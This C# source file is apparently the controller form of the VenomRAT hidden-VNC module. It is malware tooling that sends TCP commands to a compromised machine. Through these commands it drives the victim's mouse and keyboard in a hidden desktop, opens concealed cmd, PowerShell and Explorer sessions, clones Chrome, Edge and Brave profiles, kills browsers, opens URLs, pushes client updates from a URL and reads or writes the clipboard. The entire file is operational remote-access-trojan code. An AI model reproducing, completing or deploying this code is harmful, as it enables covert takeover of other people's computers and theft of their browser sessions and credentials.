using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace VenomRAT_HVNC.HVNC
{
    public partial class FrmVNC : Form
    {
        public PictureBox VNCBoxe
        {
            get
            {
                return this.VNCBox;
            }
            set
            {
                this.VNCBox = value;
            }
        }

        public ToolStripStatusLabel toolStripStatusLabel2_
        {
            get
            {
                return this.toolStripStatusLabel2;
            }
            set
            {
                this.toolStripStatusLabel2 = value;
            }
        }

        public FrmVNC()
        {
            this.int_0 = 0;
            this.bool_1 = true;
            this.bool_2 = false;
            this.FrmTransfer0 = new FrmTransfer();
            this.InitializeComponent();
            this.VNCBox.MouseEnter += this.VNCBox_MouseEnter;
            this.VNCBox.MouseLeave += this.VNCBox_MouseLeave;
            this.VNCBox.KeyPress += this.VNCBox_KeyPress;
        }

        private void VNCBox_MouseEnter(object sender, EventArgs e)
        {
            this.VNCBox.Focus();
        }

        private void VNCBox_MouseLeave(object sender, EventArgs e)
        {
            base.FindForm().ActiveControl = null;
            base.ActiveControl = null;
        }

        private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
        }

        private void VNCForm_Load(object sender, EventArgs e)
        {
            if (this.FrmTransfer0.IsDisposed)
            {
                this.FrmTransfer0 = new FrmTransfer();
            }
            this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            this.tcpClient_0 = (TcpClient)base.Tag;
            this.VNCBox.Tag = new Size(1028, 1028);
        }

        public void Check()
        {
            try
            {
                if (this.FrmTransfer0.FileTransferLabele.Text == null)
                {
                    this.toolStripStatusLabel3.Text = "Status";
                }
                else
                {
                    this.toolStripStatusLabel3.Text = this.FrmTransfer0.FileTransferLabele.Text;
                }
            }
            catch
            {
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            checked
            {
                this.int_0 += 100;
                if (this.int_0 >= SystemInformation.DoubleClickTime)
                {
                    this.bool_1 = true;
                    this.bool_2 = false;
                    this.int_0 = 0;
                }
            }
        }

        private void CopyBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("9*", this.tcpClient_0);
        }

        private void PasteBtn_Click(object sender, EventArgs e)
        {
            try
            {
                this.SendTCP("10*" + Clipboard.GetText(), this.tcpClient_0);
            }
            catch (Exception ex)
            {
            }
        }

        private void ShowStart_Click(object sender, EventArgs e)
        {
            this.SendTCP("13*", this.tcpClient_0);
        }

        private void VNCBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (this.bool_1)
            {
                this.bool_1 = false;
                this.timer1.Start();
            }
            else if (this.int_0 < SystemInformation.DoubleClickTime)
            {
                this.bool_2 = true;
            }
            Point location = e.Location;
            object tag = this.VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)this.VNCBox.Width / (double)size.Width;
            double num2 = (double)this.VNCBox.Height / (double)size.Height;
            double value = Math.Ceiling((double)location.X / num);
            double value2 = Math.Ceiling((double)location.Y / num2);
            if (this.bool_2)
            {
                if (e.Button == MouseButtons.Left)
                {
                    this.SendTCP("6*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                    return;
                }
            }
            else
            {
                if (e.Button == MouseButtons.Left)
                {
                    this.SendTCP("2*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                    return;
                }
                if (e.Button == MouseButtons.Right)
                {
                    this.SendTCP("3*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                }
            }
        }

        private void VNCBox_MouseUp(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = this.VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)this.VNCBox.Width / (double)size.Width;
            double num2 = (double)this.VNCBox.Height / (double)size.Height;
            double value = Math.Ceiling((double)location.X / num);
            double value2 = Math.Ceiling((double)location.Y / num2);
            if (e.Button == MouseButtons.Left)
            {
                this.SendTCP("4*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                return;
            }
            if (e.Button == MouseButtons.Right)
            {
                this.SendTCP("5*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
            }
        }

        private void VNCBox_MouseMove(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = this.VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)this.VNCBox.Width / (double)size.Width;
            double num2 = (double)this.VNCBox.Height / (double)size.Height;
            double value = Math.Ceiling((double)location.X / num);
            double value2 = Math.Ceiling((double)location.Y / num2);
            this.SendTCP("8*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, EventArgs e)
        {
            this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
            this.SendTCP("17*" + Conversions.ToString(this.IntervalScroll.Value), this.tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, EventArgs e)
        {
            this.QualityLabel.Text = "Quality : " + Conversions.ToString(this.QualityScroll.Value) + "%";
            this.SendTCP("18*" + Conversions.ToString(this.QualityScroll.Value), this.tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, EventArgs e)
        {
            this.chkClone1.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
            this.SendTCP("19*" + Conversions.ToString((double)this.ResizeScroll.Value / 100.0), this.tcpClient_0);
        }

        private void RestoreMaxBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("15*", this.tcpClient_0);
        }

        private void MinBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("14*", this.tcpClient_0);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("16*", this.tcpClient_0);
        }

        private void StartExplorer_Click(object sender, EventArgs e)
        {
            this.SendTCP("21*", this.tcpClient_0);
        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        MemoryStream memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        ulong num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }

        private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
        {
            this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
        }

        private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.SendTCP("1*", this.tcpClient_0);
            this.VNCBox.Image = null;
            GC.Collect();
            base.Dispose();
            base.Close();
            e.Cancel = true;
        }

        private void VNCForm_Click(object sender, EventArgs e)
        {
            this.method_18(null);
        }

        private void method_18(object object_0)
        {
            base.ActiveControl = (Control)object_0;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("30*" + Conversions.ToString(true), (TcpClient)base.Tag);
                return;
            }
            this.SendTCP("30*" + Conversions.ToString(false), (TcpClient)base.Tag);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            this.Check();
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (dialogResult == DialogResult.Yes)
            {
                this.SendTCP("24*", this.tcpClient_0);
                base.Close();
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
        }

        private void button7_Click(object sender, EventArgs e)
        {
            this.SendTCP("4875*", this.tcpClient_0);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            this.SendTCP("4876*", this.tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
        {
            this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
            this.SendTCP("17*" + Conversions.ToString(this.IntervalScroll.Value), this.tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
        {
            this.chkClone1.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
            this.SendTCP("19*" + Conversions.ToString((double)this.ResizeScroll.Value / 100.0), this.tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
        {
            this.QualityLabel.Text = "HQ : " + Conversions.ToString(this.QualityScroll.Value) + "%";
            this.SendTCP("18*" + Conversions.ToString(this.QualityScroll.Value), this.tcpClient_0);
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (dialogResult == DialogResult.Yes)
            {
                this.SendTCP("24*", this.tcpClient_0);
                base.Close();
            }
        }

        private void VNCBox_MouseHover(object sender, EventArgs e)
        {
            this.VNCBox.Focus();
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (dialogResult == DialogResult.Yes)
            {
                base.Close();
            }
        }

        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("21*", this.tcpClient_0);
        }

        private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("4876*", this.tcpClient_0);
        }

        private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("4875*", this.tcpClient_0);
        }

        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("13*", this.tcpClient_0);
        }

        private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("11*" + Conversions.ToString(true), (TcpClient)base.Tag);
                return;
            }
            this.SendTCP("11*" + Conversions.ToString(false), (TcpClient)base.Tag);
        }

        private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("12*" + Conversions.ToString(true), (TcpClient)base.Tag);
                return;
            }
            this.SendTCP("12*" + Conversions.ToString(false), (TcpClient)base.Tag);
        }

        private void braveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("32*" + Conversions.ToString(true), (TcpClient)base.Tag);
                return;
            }
            this.SendTCP("32*" + Conversions.ToString(false), (TcpClient)base.Tag);
        }

        private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("30*" + Conversions.ToString(true), (TcpClient)base.Tag);
                return;
            }
            this.SendTCP("30*" + Conversions.ToString(false), (TcpClient)base.Tag);
        }

        public void hURL(string url)
        {
            this.SendTCP("8585* " + url, (TcpClient)base.Tag);
        }

        public void UpdateClient(string url)
        {
            this.SendTCP("8589* " + url, (TcpClient)base.Tag);
        }

        public void CloseClient()
        {
            this.SendTCP("24*", (TcpClient)base.Tag);
        }

        public void ResetScale()
        {
            this.SendTCP("8587*", (TcpClient)base.Tag);
        }

        public void KillChrome()
        {
            this.SendTCP("8586*", (TcpClient)base.Tag);
        }

        private void exportbtn_Click(object sender, EventArgs e)
        {
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("3307*", this.tcpClient_0);
        }

        private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
        }

        private void ToggleHVNC_CheckedChanged(object sender, EventArgs e)
        {
            if (this.ToggleHVNC.Checked)
            {
                this.SendTCP("0*", this.tcpClient_0);
                this.FrmTransfer0.FileTransferLabele.Text = "HVNC Started!";
                return;
            }
            if (!this.ToggleHVNC.Checked)
            {
                this.SendTCP("1*", this.tcpClient_0);
                this.VNCBox.Image = null;
                this.FrmTransfer0.FileTransferLabele.Text = "HVNC Stopped!";
                GC.Collect();
                return;
            }
        }

        public static string labelstatus { get; set; }

        private void toolStripStatusLabel3_TextChanged(object sender, EventArgs e)
        {
            FrmVNC.labelstatus = this.FrmTransfer0.FileTransferLabele.Text;
            if (FrmVNC.labelstatus == "Idle")
            {
                this.statusled.FillColor = Color.White;
                return;
            }
            if (FrmVNC.labelstatus.Contains("MB"))
            {
                this.ledstatus.Text = "Cloning Profile...";
                this.statusled.FillColor = Color.Yellow;
                return;
            }
            if (FrmVNC.labelstatus.Contains("initiated"))
            {
                this.ledstatus.Text = "Profile Cloned";
                this.statusled.FillColor = Color.FromArgb(4, 143, 110);
                return;
            }
        }

        private TcpClient tcpClient_0;

        private int int_0;

        private bool bool_1;

        private bool bool_2;

        public FrmTransfer FrmTransfer0;
    }
}
